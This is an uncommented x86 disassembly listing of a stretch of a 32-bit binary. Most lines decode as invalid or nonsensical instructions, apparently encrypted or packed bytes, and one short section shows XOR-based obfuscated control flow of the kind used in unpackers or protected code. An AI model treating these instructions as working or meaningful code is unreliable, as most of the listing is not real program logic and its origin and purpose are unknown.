  41846d:	cmp    eax,0x845f47a7
  418472:	jne    0x4184b5
  418474:	jp     0x418486
  418476:	add    al,0x90
  418478:	cmp    al,0x81
  41847a:	pop    eax
  41847b:	xchg   edx,eax
  41847c:	xor    bl,bh
  41847e:	push   eax
  41847f:	xor    al,0x76
  418481:	jmp    0x77950ae1
  418486:	mov    ah,0xce
  418488:	inc    ebx
  418489:	popa   
  41848a:	mov    al,ds:0x2eb05a2a
  41848f:	dec    edx
  418490:	inc    ecx
  418491:	pop    eax
  418492:	lea    esi,[ebx+0x747dfac7]
  418498:	out    0x5a,eax
  41849a:	(bad)  
  41849b:	or     edi,DWORD PTR [ebx]
  41849d:	jle    0x4184bb
  41849f:	popa   
  4184a0:	pop    edx
  4184a1:	push   es
  4184a2:	sahf   
  4184a3:	stos   DWORD PTR es:[edi],eax
  4184a4:	mov    al,ds:0x46c4d2be
  4184a9:	dec    edi
  4184aa:	call   0x13e7:0xcbfcb321
  4184b1:	jae    0x418494
  4184b3:	sbb    ecx,esp
  4184b5:	or     ebp,DWORD PTR [eax+ebx*8-0x56051f35]
  4184bc:	cs jle 0x4184b0
  4184bf:	out    dx,al
  4184c0:	dec    eax
  4184c1:	and    eax,0x5a16bdb7
  4184c6:	leave  
  4184c7:	adc    eax,ebp
  4184c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ca:	cmp    BYTE PTR [esi+0x32f1c5a1],ah
  4184d0:	nop
  4184d1:	mov    ds:0x25c0583e,al
  4184d6:	inc    BYTE PTR [ecx+0x52]
  4184d9:	xor    DWORD PTR [ebp+0x3],eax
  4184dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184dd:	addr16 xchg cx,ax
  4184e0:	jbe    0x41852b
  4184e2:	jmp    0x41854f
  4184e4:	test   ax,0xb634
  4184e8:	dec    ebx
  4184e9:	or     dh,cl
  4184eb:	(bad)  
  4184ec:	sbb    DWORD PTR [eax],edx
  4184ee:	outs   dx,DWORD PTR ds:[esi]
  4184ef:	outs   dx,BYTE PTR ds:[esi]
  4184f0:	and    eax,0xe38df0cf
  4184f5:	jo     0x41856b
  4184f7:	jo     0x418544
  4184f9:	lahf   
  4184fa:	mov    al,0x8e
  4184fc:	jnp    0x41853c
  4184fe:	dec    ecx
  4184ff:	xchg   ebp,eax
  418500:	sub    cl,cl
  418502:	fidivr WORD PTR [edi+0x8]
  418505:	(bad)  
  418506:	std    
  418507:	xor    ebx,DWORD PTR [edi+0x2d655238]
  41850d:	xchg   edi,eax
  41850e:	pop    edx
  41850f:	push   eax
  418510:	nop
  418511:	pop    ss
  418512:	or     ecx,edx
  418514:	fwait
  418515:	or     DWORD PTR [ebx],0x5e
  418518:	std    
  418519:	fwait
  41851a:	sub    DWORD PTR [edi+0x39],0xa
  41851e:	dec    ebx
  41851f:	sar    BYTE PTR [esi+0x10a1b09e],0x6b
  418526:	es aad 0x86
  418529:	mov    ebx,0x5ce23ff4
  41852e:	inc    edx
  41852f:	xor    DWORD PTR [ecx],esp
  418531:	dec    ecx
  418532:	adc    dl,BYTE PTR [esi+0x33]
  418535:	mov    al,ds:0x1063e715
  41853a:	pop    ebx
  41853b:	es mov esp,0x5987ade0
  418541:	sti    
  418542:	and    esi,DWORD PTR [eax-0x52]
  418545:	pop    es
  418546:	sub    ebx,DWORD PTR ds:0xb3ec8e3d
  41854c:	ins    DWORD PTR es:[edi],dx
  41854d:	mov    al,0x43
  41854f:	aas    
  418550:	ins    BYTE PTR es:[edi],dx
  418551:	jae    0x4185ac
  418553:	sbb    eax,0xce2c8045
  418558:	xchg   esp,eax
  418559:	popa   
  41855a:	push   esp
  41855b:	jne    0x41855d
  41855d:	push   cs
  41855e:	(bad)
  418561:	mov    eax,0x8bb128be
  418566:	call   0xe7a32055
  41856b:	repz xchg esi,eax
  41856d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856e:	mov    ah,0xa1
  418570:	mov    dh,ch
  418572:	cld    
  418573:	nop
  418574:	cmp    edi,esp
  418576:	mov    dl,0x69
  418578:	push   0xf5d655a9
  41857d:	xchg   ebp,eax
  41857e:	sub    DWORD PTR [esi+0x26],esi
  418581:	into   
  418582:	push   eax
  418583:	ja     0x41851b
  418585:	pop    ebp
  418586:	and    BYTE PTR [ecx+0x4d],0xec
  41858a:	add    eax,0x6e663464
  41858f:	mov    ds:0xfd288a5f,eax
  418594:	lds    ebp,FWORD PTR [eax+eiz*4]
  418597:	mov    eax,ds:0x489e13f7
  41859c:	icebp  
  41859d:	sbb    BYTE PTR [ecx],cl
  41859f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185a0:	push   esp
  4185a1:	dec    ecx
  4185a2:	les    esi,FWORD PTR [edx-0x5e]
  4185a5:	mov    fs,WORD PTR [eax+eax*4]
  4185a8:	shr    BYTE PTR [ebx],1
  4185aa:	push   edi
  4185ab:	lods   al,BYTE PTR ds:[esi]
  4185ac:	in     eax,0xd6
  4185ae:	or     bl,0xbb
  4185b1:	(bad)  
  4185b2:	lds    eax,FWORD PTR [ebp+0x36]
  4185b5:	jae    0x41860c
  4185b7:	push   0x9c3605f1
  4185bc:	test   al,0x8f
  4185be:	inc    ebp
  4185bf:	mov    eax,ds:0xb9e9761b
  4185c4:	xchg   DWORD PTR [esi-0x20],ebx
  4185c7:	imul   esp,DWORD PTR [edi*2+0x56779608],0xffffffab
  4185cf:	into   
  4185d0:	and    ebx,0x5de72ea4
  4185d6:	fild   QWORD PTR es:[edi]
  4185d9:	bound  esi,QWORD PTR [esi-0xb]
  4185dc:	add    BYTE PTR [ecx-0x66],ah
  4185df:	lds    edx,FWORD PTR [eax]
  4185e1:	adc    eax,0x86679eb0
  4185e6:	scas   al,BYTE PTR es:[edi]
  4185e7:	aad    0x6b
  4185e9:	mov    ebx,0x61d5b211
  4185ee:	clc    
  4185ef:	loope  0x418588
  4185f1:	not    ch
  4185f3:	mov    WORD PTR [ecx],fs
  4185f5:	pop    es
  4185f6:	inc    esi
  4185f7:	out    dx,eax
  4185f8:	mov    dh,BYTE PTR [esi+0x481185a1]
  4185fe:	into   
  4185ff:	add    eax,0xf0b29257
  418604:	loope  0x4185d7
  418606:	in     eax,0x91
  418608:	in     al,0xc7
  41860a:	aad    0x23
  41860c:	jns    0x418608
  41860e:	jne    0x4185ca
  418610:	mov    esi,0xe9bc6291
  418615:	ins    DWORD PTR es:[edi],dx
  418616:	or     BYTE PTR [ebx-0x5e5d9aa4],0x18
  41861d:	xchg   edi,esi
  41861f:	inc    ecx
  418620:	jmp    0x418632
  418622:	jge    0x4185b3
  418624:	push   ebp
  418625:	dec    ebp
  418626:	sbb    dh,BYTE PTR [esi-0x12aafe0]
  41862c:	mov    edi,0x25278cbf
  418631:	pop    eax
  418632:	jb     0x4185ed
  418634:	or     esp,DWORD PTR [edx+0x72ef5414]
  41863a:	mov    cl,0xb1
  41863c:	fldenv ds:0x3ea8abce
  418642:	inc    edi
  418643:	adc    ebp,DWORD PTR [eax]
  418645:	pop    edi
  418646:	retf   
  418647:	inc    ebx
  418648:	pop    edx
  418649:	leave  
  41864a:	arpl   WORD PTR [edx-0x6bfc7fac],cx
  418650:	or     BYTE PTR [ebp-0x49],cl
  418653:	ins    BYTE PTR es:[edi],dx
  418654:	jb     0x4186ca
  418656:	add    al,0xf5
  418658:	(bad)  
  418659:	pop    eax
  41865a:	lahf   
  41865b:	add    BYTE PTR [esi+0x2d],dl
  41865e:	push   0xffffffbc
  418660:	fcom   DWORD PTR [ecx]
  418662:	pop    eax
  418663:	into   
  418664:	mov    edx,0x401112c7
  418669:	dec    esp
  41866a:	clc    
  41866b:	push   esp
  41866c:	xchg   esp,eax
  41866d:	loop   0x4186da
  41866f:	add    al,0x61
  418671:	out    0xf,eax
  418673:	in     eax,0xce
  418675:	add    cl,al
  418677:	lds    esi,FWORD PTR [edi-0x79]
  41867a:	push   edi
  41867b:	sub    al,0x78
  41867d:	add    ecx,DWORD PTR [edx+0x10]
  418680:	mov    eax,ds:0x8c84e85d
  418685:	cmp    dh,dl
  418687:	push   0x940b0c87
  41868c:	fidivr DWORD PTR [ebp+0xe]
  41868f:	mov    dl,BYTE PTR [ecx+0x632ef54d]
  418695:	scas   al,BYTE PTR es:[edi]
  418696:	es out 0xa5,al
  418699:	push   0xffffff9c
  41869b:	add    eax,0x2b2e7692
  4186a0:	jae    0x418702
  4186a2:	lahf   
  4186a3:	push   0x1837e75c
  4186a8:	je     0x4186f7
  4186aa:	ins    DWORD PTR es:[edi],dx
  4186ab:	jno    0x41865d
  4186ad:	cmp    dh,cl
  4186af:	xchg   edi,eax
  4186b0:	pop    esi
  4186b1:	sub    DWORD PTR [eax+ebp*8+0x5a],esi
  4186b5:	sub    BYTE PTR [ecx+0x5b],cl
  4186b8:	out    dx,al
  4186b9:	adc    ebx,DWORD PTR [edx+0x13]
  4186bc:	sbb    DWORD PTR [edi-0x4761a207],ebx
  4186c2:	push   ss
  4186c3:	jno    0x4186fa
  4186c5:	jge    0x4186c1
  4186c7:	dec    edi
  4186c8:	jb     0x41871a
  4186ca:	fsub   st,st(4)
  4186cc:	outs   dx,DWORD PTR ds:[esi]
  4186cd:	loope  0x41865c
  4186cf:	and    DWORD PTR [esi+ecx*1+0x4efe838e],0xffffff83
  4186d7:	ss enter 0xbd12,0x9f
  4186dc:	mov    bh,0xe
  4186de:	fld    st(0)
  4186e0:	cli    
  4186e1:	or     dh,BYTE PTR [esi]
  4186e3:	mov    edx,0xa6f71720
  4186e8:	push   eax
  4186e9:	stos   BYTE PTR es:[edi],al
  4186ea:	cmp    DWORD PTR [ebp+0x1e9ea3ac],esi
  4186f0:	jb     0x418721
  4186f2:	and    ebp,0xbda97f60
  4186f8:	jl     0x418759
  4186fa:	gs into 
  4186fc:	fst    QWORD PTR [edx]
  4186fe:	data16 sahf 
  418700:	loopne 0x4186f7
  418702:	les    eax,FWORD PTR [ecx]
  418704:	mov    BYTE PTR [ecx-0x2fccc4a1],dl
  41870a:	lea    edx,[edx+ebx*1+0x3272e0]
  418711:	mov    DWORD PTR [ebp-0xc],edx
  418714:	mov    edx,DWORD PTR [ebp-0x10]
  418717:	xor    edx,eax
  418719:	add    edx,esi
  41871b:	jne    0x40f646
  418721:	jmp    0x41abbe
  418726:	mov    ecx,DWORD PTR [ebp-0x14]
  418729:	mov    DWORD PTR [ebp+0x8],ecx
  41872c:	jmp    0x4187a5
  418731:	mov    ecx,DWORD PTR [ebp+0x8]
  418734:	mov    edx,DWORD PTR [ebp-0x8]
  418737:	xor    ecx,eax
  418739:	xor    edx,eax
  41873b:	sub    ecx,edx
  41873d:	sub    ecx,esi
  41873f:	xor    ecx,eax
  418741:	mov    DWORD PTR [ebp+0x8],ecx
  418744:	mov    ecx,DWORD PTR [ebp+0x8]
  418747:	mov    edx,DWORD PTR [ebp-0x58]
  41874a:	add    ecx,0x5708f8
  418750:	imul   ecx,edx
  418753:	mov    DWORD PTR [ebp-0x58],ecx
  418756:	mov    ecx,DWORD PTR [ebp+0x8]
  418759:	mov    edx,DWORD PTR [ebp-0x54]
  41875c:	add    ecx,0x64f8da
  418762:	or     ecx,edx
  418764:	mov    DWORD PTR [ebp-0x54],ecx
  418767:	mov    ecx,DWORD PTR [ebp+0x8]
  41876a:	mov    edx,DWORD PTR [ebp-0x50]
  41876d:	add    ecx,0x242ebed
  418773:	xor    ecx,edx
  418775:	mov    DWORD PTR [ebp-0x50],ecx
  418778:	mov    ecx,DWORD PTR [ebp+0x8]
  41877b:	mov    edx,DWORD PTR [ebp-0x4c]
  41877e:	add    ecx,edi
  418780:	and    ecx,edx
  418782:	mov    DWORD PTR [ebp-0x4c],ecx
  418785:	mov    ecx,DWORD PTR [ebp+0x8]
  418788:	mov    edx,DWORD PTR [ebp-0x48]
  41878b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  418792:	mov    DWORD PTR [ebp-0x48],ecx
  418795:	mov    ecx,DWORD PTR [ebp+0x8]
  418798:	mov    edx,0xfa5e15e2
  41879d:	sub    edx,ecx
  41879f:	add    edx,DWORD PTR [ebp-0x44]
  4187a2:	mov    DWORD PTR [ebp-0x44],edx
  4187a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4187a8:	xor    ecx,eax
  4187aa:	add    ecx,esi
  4187ac:	jne    0x418731
  4187b2:	jmp    0x41abca
  4187b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4187ba:	mov    edx,DWORD PTR [ebp-0x8]
  4187bd:	xor    ecx,eax
  4187bf:	xor    edx,eax
  4187c1:	sub    ecx,edx
  4187c3:	sub    ecx,esi
  4187c5:	xor    ecx,eax
  4187c7:	mov    DWORD PTR [ebp+0x8],ecx
  4187ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4187cd:	mov    edx,DWORD PTR [ebp-0x58]
  4187d0:	jmp    0x41ab56
  4187d5:	sub    eax,0x97a551eb
  4187da:	fwait
  4187db:	lods   eax,DWORD PTR ds:[esi]
  4187dc:	fistp  DWORD PTR [edx]
  4187de:	pop    ecx
  4187df:	imul   DWORD PTR [ecx]
  4187e1:	rcr    BYTE PTR [ecx],0xe7
  4187e4:	pop    edx
  4187e5:	jmp    0x41881b
  4187e7:	jns    0x418863
  4187e9:	add    DWORD PTR [edi+0x7a],ebx
  4187ec:	jp     0x41882f
  4187ee:	shl    BYTE PTR [eax+edi*1-0x18],0xe0
  4187f3:	(bad)  
  4187f5:	push   ecx
  4187f6:	int    0xd2
  4187f8:	xlat   BYTE PTR ds:[ebx]
  4187f9:	cwde   
  4187fa:	xor    DWORD PTR [edx-0x26d0147d],esp
  418800:	in     eax,dx
  418801:	xchg   ecx,eax
  418802:	outs   dx,DWORD PTR ds:[esi]
  418803:	sub    eax,0xb39c3f14
  418808:	inc    edx
  418809:	lahf   
  41880a:	cmp    edx,DWORD PTR [ebx-0x52f63949]
  418810:	mov    edx,0x63566858
  418815:	jo     0x41887b
  418817:	sub    al,0x8d
  418819:	enter  0xb953,0xfd
  41881d:	sub    bl,BYTE PTR [esi-0xbc2263e]
  418823:	sbb    BYTE PTR [eax+0x7fe23384],al
  418829:	or     BYTE PTR ds:0xd08397bc,0x2c
  418830:	mov    al,ds:0xf9179c8e
  418835:	pop    ebp
  418836:	aas    
  418837:	(bad)  
  418838:	lahf   
  418839:	mov    al,0xd9
  41883b:	or     DWORD PTR [eax-0x5e],ebp
  41883e:	and    al,0xab
  418840:	popa   
  418841:	icebp  
  418842:	sbb    BYTE PTR [ebx],dl
  418844:	push   es
  418845:	lea    esi,[ebp+0x8]
  418848:	test   edi,0xe591683b
  41884e:	cmp    al,0xb5
  418850:	in     eax,0xec
  418852:	and    eax,0x64e3d83
  418857:	mov    ds:0xe6a68e02,eax
  41885c:	pop    edi
  41885d:	repnz mov esi,0xb596aed1
  418863:	inc    ebp
  418864:	cwde   
  418865:	ja     0x418848
  418867:	pop    edx
  418868:	ss jle 0x418804
  41886b:	popa   
  41886c:	outs   dx,BYTE PTR ds:[esi]
  41886d:	jne    0x418845
  41886f:	sub    dl,BYTE PTR [ebp+0x19]
  418872:	jecxz  0x4188a0
  418874:	xlat   BYTE PTR es:[ebx]
  418876:	push   ebp
  418877:	push   ds
  418878:	xchg   esi,eax
  418879:	imul   ecx,DWORD PTR [edx-0x18],0x63bae33e
  418880:	pop    ss
  418881:	add    al,0xce
  418883:	lods   al,BYTE PTR ds:[esi]
  418884:	xor    al,0x55
  418886:	sub    edi,ebx
  418888:	xchg   edx,eax
  418889:	cld    
  41888a:	addr16 push eax
  41888c:	sbb    eax,0x3bc5b378
  418891:	adc    ah,bh
  418893:	xlat   BYTE PTR ds:[ebx]
  418894:	mov    edx,0xcd7ddd38
  418899:	mov    eax,ds:0xf0b1f889
  41889e:	inc    esp
  41889f:	pop    ds
  4188a0:	es jge 0x41885a
  4188a3:	test   ah,cl
  4188a5:	sbb    bh,BYTE PTR [ebx+esi*8-0x14]
  4188a9:	ficom  WORD PTR [ebx+0x37]
  4188ac:	sub    BYTE PTR [esi+0x677faaff],ah
  4188b2:	or     al,0xf1
  4188b4:	nop
  4188b5:	aas    
  4188b6:	pop    ds
  4188b7:	jmp    FWORD PTR [eax-0x29dd5733]
  4188bd:	retf   
  4188be:	(bad)  
  4188bf:	xchg   esp,eax
  4188c0:	pusha  
  4188c1:	out    dx,eax
  4188c2:	out    dx,al
  4188c3:	out    0xa,eax
  4188c5:	add    al,0xc4
  4188c7:	inc    ecx
  4188c8:	push   esp
  4188c9:	mov    gs,WORD PTR [edi-0x15]
  4188cc:	jp     0x41885e
  4188ce:	add    eax,0xa353ca0d
  4188d3:	inc    edx
  4188d4:	lods   eax,DWORD PTR ds:[esi]
  4188d5:	push   edx
  4188d6:	jno    0x418906
  4188d8:	fdiv   QWORD PTR [eax+0x15]
  4188db:	sbb    eax,0xfe6d797c
  4188e0:	test   DWORD PTR [esi+0x688f4744],0x3b4512b3
  4188ea:	out    0x7c,eax
  4188ec:	jmp    0x418875
  4188ee:	test   al,0xf4
  4188f0:	dec    ebx
  4188f1:	shl    dh,1
  4188f3:	pop    ecx
  4188f4:	scas   eax,DWORD PTR es:[edi]
  4188f5:	xor    BYTE PTR [ecx+0x7b],0x8d
  4188f9:	mov    esi,0x1810348a
  4188fe:	add    al,0x79
  418900:	sub    esi,0x28501ab0
  418906:	and    DWORD PTR ds:0x1d5f6f7f,ecx
  41890c:	rcl    DWORD PTR [edx],0x3b
  41890f:	pop    ebx
  418910:	test   DWORD PTR [eax+ebp*2+0x7a1e620e],esp
  418917:	adc    al,bl
  418919:	push   ebp
  41891a:	jmp    0x626432ec
  41891f:	adc    ch,BYTE PTR [ecx+0x479cb1f9]
  418925:	lods   eax,DWORD PTR ds:[esi]
  418926:	mov    edx,0x2a148231
  41892b:	inc    edx
  41892c:	sbb    DWORD PTR [edi-0x3494b06d],ecx
  418932:	xchg   esp,eax
  418933:	xor    eax,0x43647644
  418938:	or     BYTE PTR [esi-0x3a],al
  41893b:	(bad)  
  41893c:	jg     0x418961
  41893e:	int    0x9a
  418940:	mov    ds:0x5f6da58f,al
  418945:	(bad)  
  418946:	push   ebp
  418947:	call   0x4591:0xfde10195
  41894e:	pop    esi
  41894f:	not    BYTE PTR [ebx+0x3f]
  418952:	in     eax,0xf7
  418954:	lea    eax,[eax+0x76]
  418957:	mov    ecx,0xe81a45f1
  41895c:	add    eax,0x83a970a5
  418961:	adc    eax,edx
  418963:	xor    DWORD PTR [ebp+edi*4-0x41],edi
  418967:	mov    al,0xab
  418969:	adc    eax,0xe83d2f5c
  41896e:	inc    ebx
  41896f:	dec    BYTE PTR [ebx+0x60158460]
  418975:	retf   0xc7f1
  418978:	cmp    eax,0xd4f8adeb
  41897d:	ret    0x1805
  418980:	addr16 pop eax
  418982:	jl     0x4189fe
  418984:	or     BYTE PTR [ebp-0x27],dh
  418987:	mov    dl,0x89
  418989:	cmp    BYTE PTR [edx],0xee
  41898c:	pop    eax
  41898d:	dec    edx
  41898e:	loopne 0x4189be
  418990:	adc    al,0xd7
  418992:	(bad)  
  418993:	(bad)  
  418994:	dec    edx
  418995:	das    
  418996:	or     dl,BYTE PTR [edx]
  418998:	jg     0x41894c
  41899a:	outs   dx,BYTE PTR ds:[esi]
  41899b:	clc    
  41899c:	dec    edx
  41899d:	(bad)  
  41899e:	fimul  DWORD PTR [ecx-0x1967dd4d]
  4189a4:	clc    
  4189a5:	push   0x96e2034c
  4189aa:	push   ebx
  4189ab:	mov    dh,0x61
  4189ad:	and    eax,0xfc36d8c0
  4189b2:	cwde   
  4189b3:	mov    BYTE PTR [ebp-0x8],0x1f
  4189b7:	sbb    DWORD PTR [ecx],0x1b
  4189ba:	sbb    dl,bl
  4189bc:	pop    eax
  4189bd:	pop    es
  4189be:	rcl    eax,0x84
  4189c1:	inc    esp
  4189c2:	aam    0x93
  4189c4:	loope  0x418a2d
  4189c6:	jno    0x4189e2
  4189c8:	and    al,0x7f
  4189ca:	jnp    0x4189b0
  4189cc:	bound  edx,QWORD PTR [esi+0x74]
  4189cf:	js     0x41896e
  4189d1:	pop    ebp
  4189d2:	scas   al,BYTE PTR es:[edi]
  4189d3:	jo     0x418a2b
  4189d5:	idiv   BYTE PTR [ecx]
  4189d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189d8:	sbb    al,bl
  4189da:	xchg   edx,eax
  4189db:	mov    ch,0x19
  4189dd:	adc    al,0xe4
  4189df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189e0:	jno    0x418a1b
  4189e2:	neg    DWORD PTR [ebx+ecx*2+0x237ff59c]
  4189e9:	dec    esi
  4189ea:	popf   
  4189eb:	jl     0x418a1c
  4189ed:	cmp    ah,BYTE PTR [edi-0x22]
  4189f0:	popf   
  4189f1:	sbb    eax,0x8eafae98
  4189f6:	dec    ebp
  4189f7:	xor    eax,0x52c54156
  4189fc:	mov    ecx,0x11bc1101
  418a01:	jmp    0xf52a:0xab7dd9e6
  418a08:	das    
  418a09:	cmp    al,0x42
  418a0b:	cmp    BYTE PTR [esi],0xa6
  418a0e:	popa   
  418a0f:	sub    BYTE PTR [ebx],dh
  418a11:	sub    esi,DWORD PTR [edx+0x2d75c6e3]
  418a17:	aas    
  418a18:	jno    0x418a4d
  418a1a:	ret    
  418a1b:	xor    DWORD PTR [ebx-0x9],0x43
  418a1f:	push   edi
  418a20:	(bad)  
  418a22:	push   es
  418a23:	xchg   edx,eax
  418a24:	lods   eax,DWORD PTR ds:[esi]
  418a25:	loope  0x418a96
  418a27:	add    al,0xd8
  418a29:	or     eax,DWORD PTR [edx]
  418a2b:	sub    DWORD PTR [edx+0x430ebbf2],ecx
  418a31:	rcr    BYTE PTR [ecx],0x60
  418a34:	lds    ecx,FWORD PTR [ebx+0x7f652794]
  418a3a:	dec    esp
  418a3b:	and    al,0x76
  418a3d:	adc    ebx,DWORD PTR [si+0x42]
  418a41:	sbb    BYTE PTR [eax],dl
  418a43:	adc    BYTE PTR [esi],0xa4
  418a46:	test   BYTE PTR [ebx],cl
  418a48:	out    0x79,al
  418a4a:	(bad)  
  418a4b:	mov    esi,0xed11dfbe
  418a50:	push   esp
  418a51:	int    0x9
  418a53:	dec    BYTE PTR ds:0x5d84288
  418a59:	enter  0xeeac,0x7a
  418a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5e:	push   0xffffffb6
  418a60:	sar    BYTE PTR [edi+edi*8-0x7f],1
  418a64:	cdq    
  418a65:	sub    DWORD PTR [edi-0x9],esp
  418a68:	inc    ecx
  418a69:	mov    al,0xce
  418a6b:	pop    ebx
  418a6c:	out    dx,eax
  418a6d:	mov    ds:0x57d23db,al
  418a72:	mov    ah,0xdb
  418a74:	push   ds
  418a75:	and    al,0xe9
  418a77:	test   BYTE PTR [ebp+0x4a],al
  418a7a:	dec    ebx
  418a7b:	das    
  418a7c:	mov    edi,0xad09cf60
  418a81:	das    
  418a82:	lds    eax,FWORD PTR [esp+eax*4]
  418a85:	add    bl,BYTE PTR ds:0x3a7a19d3
  418a8b:	vsqrtsd xmm3,xmm1,QWORD PTR [edi]
  418a8f:	cwde   
  418a90:	inc    esi
  418a91:	jl     0x418a32
  418a93:	adc    al,0x2d
  418a95:	rcl    BYTE PTR [esi],0x1
  418a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a99:	dec    edx
  418a9a:	out    dx,al
  418a9b:	jne    0x418a40
  418a9d:	cmp    esi,DWORD PTR [eax+0x63]
  418aa0:	fidivr DWORD PTR [edx+0x340bc13a]
  418aa6:	rcl    DWORD PTR [esi],0x73
  418aa9:	test   eax,0x7c2f838b
  418aae:	lea    ecx,[edx-0x30f050b3]
  418ab4:	mov    bh,0xf9
  418ab6:	call   0x1806:0xe4f20758
  418abd:	mov    cl,0xb6
  418abf:	jle    0x418a95
  418ac1:	enter  0x9648,0xcb
  418ac5:	xchg   esp,eax
  418ac6:	xor    BYTE PTR [ebp+0x2173af2e],dl
  418acc:	xchg   ecx,eax
  418acd:	sub    ch,ah
  418acf:	dec    edx
  418ad0:	add    eax,0x7a139510
  418ad5:	cs inc edx
  418ad7:	in     eax,0x50
  418ad9:	jne    0x418aa1
  418adb:	mov    ds:0xf3f841f3,eax
  418ae0:	iret   
  418ae1:	hlt    
  418ae2:	iret   
  418ae3:	mov    eax,ds:0x4d84e787
  418ae8:	jecxz  0x418a93
  418aea:	cmp    al,bh
  418aec:	xchg   esi,eax
  418aed:	(bad)  
  418aee:	cmp    DWORD PTR [edi],0x9aa0b254
  418af4:	rcr    DWORD PTR ds:0x9a8ee062,1
  418afa:	mov    dl,0x6
  418afc:	fcom   DWORD PTR [edi]
  418afe:	lea    esi,[ebx+0x1c]
  418b01:	out    0x4b,al
  418b03:	mov    BYTE PTR [esi],cl
  418b05:	shl    DWORD PTR [ecx-0x105a5fd1],1
  418b0b:	push   esp
  418b0c:	or     DWORD PTR [ecx+0x2a],edx
  418b0f:	and    BYTE PTR [edx-0x1f25d913],0xc5
  418b16:	pop    esp
  418b17:	sbb    al,0xc2
  418b19:	test   eax,0x386ef743
  418b1e:	icebp  
  418b1f:	jl     0x418ae1
  418b21:	sbb    DWORD PTR [eax],0x67ac1f73
  418b27:	dec    bh
  418b29:	dec    esi
  418b2a:	mov    DWORD PTR [ecx],ebp
  418b2c:	mov    dh,0x33
  418b2e:	outs   dx,DWORD PTR ds:[esi]
  418b2f:	pop    eax
  418b30:	or     ebx,esp
  418b32:	mov    edx,0x71dfe163
  418b37:	cld    
  418b38:	cmp    al,0xb
  418b3a:	stos   BYTE PTR es:[edi],al
  418b3b:	xchg   DWORD PTR [ebx-0x183c4c3],ecx
  418b41:	aaa    
  418b42:	mov    ah,BYTE PTR [ebx+ecx*2+0x704f2057]
  418b49:	push   eax
  418b4a:	nop
  418b4b:	pushf  
  418b4c:	cmc    
  418b4d:	mov    ss,WORD PTR ds:[edx-0x468d8543]
  418b54:	sub    ah,BYTE PTR [edx+0x40]
  418b57:	mov    ebx,0x1e87b767
  418b5c:	out    0xd6,al
  418b5e:	xor    BYTE PTR [edx+0x6d25a7d9],dl
  418b64:	push   cs
  418b65:	daa    
  418b66:	mov    dl,0x55
  418b68:	pop    ds
  418b69:	add    al,0x29
  418b6b:	dec    esp
  418b6c:	ds xchg esi,eax
  418b6e:	sahf   
  418b6f:	popa   
  418b70:	sub    eax,0x6bef5403
  418b75:	fsub   QWORD PTR [ebp+0xcea8385]
  418b7b:	dec    esi
  418b7c:	ds jo  0x418b19
  418b7f:	shl    BYTE PTR [ecx+0x75],cl
  418b82:	sub    eax,eax
  418b84:	fidiv  DWORD PTR [ebx-0x3]
  418b87:	and    eax,0xb41f8215
  418b8c:	push   ecx
  418b8d:	xor    bh,BYTE PTR [edi-0x2e]
  418b90:	add    eax,0x86c9ded9
  418b95:	xchg   edx,eax
  418b96:	mov    esp,0xea4465ea
  418b9b:	cli    
  418b9c:	inc    esi
  418b9d:	xchg   edi,eax
  418b9e:	jg     0x418b92
  418ba0:	xchg   edi,eax
  418ba1:	(bad)  
  418ba2:	icebp  
  418ba3:	retf   0xbe1f
  418ba6:	and    eax,0xd41e33da
  418bab:	int    0x49
  418bad:	inc    esi
  418bae:	cld    
  418baf:	in     al,dx
  418bb0:	aad    0x40
  418bb2:	shr    cl,cl
  418bb4:	lock out 0xc6,eax
  418bb7:	xchg   BYTE PTR [eax-0x240ea6b2],ah
  418bbd:	std    
  418bbe:	cmp    cl,ah
  418bc0:	push   ebp
  418bc1:	mov    edi,0x50dbee7
  418bc6:	sub    ebp,DWORD PTR [eax+0x780ea957]
  418bcc:	or     ebp,DWORD PTR es:[ebx-0x46ef0ff9]
  418bd3:	iret   
  418bd4:	or     al,BYTE PTR [ebp-0x67dcfab8]
  418bda:	jge    0x418c39
  418bdc:	mov    cl,ah
  418bde:	(bad)  
  418bdf:	sbb    eax,0xb4f6ea02
  418be4:	cli    
  418be5:	xor    eax,0x2374cc27
  418bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418beb:	mov    BYTE PTR [edx],ah
  418bed:	out    0xb0,eax
  418bef:	daa    
  418bf0:	sub    ebx,esi
  418bf2:	cmp    BYTE PTR [ebp+esi*4-0x2243f61f],dl
  418bf9:	in     eax,0x5f
  418bfb:	or     edx,esi
  418bfd:	fs scas eax,DWORD PTR es:[edi]
  418bff:	(bad)  
  418c00:	jmp    0x9a241832
  418c05:	sbb    bh,BYTE PTR [eax-0x1e306186]
  418c0b:	mov    edx,0x6c5092c9
  418c10:	adc    esp,DWORD PTR [ecx+ebx*2-0x55]
  418c14:	add    eax,DWORD PTR [edi+0x54]
  418c17:	in     al,dx
  418c18:	or     dh,BYTE PTR [eax]
  418c1a:	fcomi  st,st(7)
  418c1c:	jns    0x418c36
  418c1e:	sub    DWORD PTR [esi-0x64],edx
  418c21:	pop    ecx
  418c22:	pop    eax
  418c23:	xchg   esi,eax
  418c24:	adc    dl,0xb1
  418c27:	jge    0x418c32
  418c29:	inc    esp
  418c2a:	jmp    0xb710a10b
  418c2f:	repnz pop ds
  418c31:	pop    es
  418c32:	mov    edi,0x3967191
  418c37:	jg     0x418c9b
  418c39:	sbb    DWORD PTR [ebx+eiz*2-0x218c8454],esp
  418c40:	in     al,dx
  418c41:	jmp    eax
  418c43:	mov    edx,0x9c8e6f79
  418c48:	outs   dx,DWORD PTR ds:[esi]
  418c49:	(bad)
  418c4d:	adc    ah,BYTE PTR [ecx+0x47]
  418c50:	ds mov bh,0xf5
  418c53:	xor    ah,BYTE PTR ds:0x24e3e923
  418c59:	pop    edx
  418c5a:	in     eax,dx
  418c5b:	sub    BYTE PTR [edx+0x75],dl
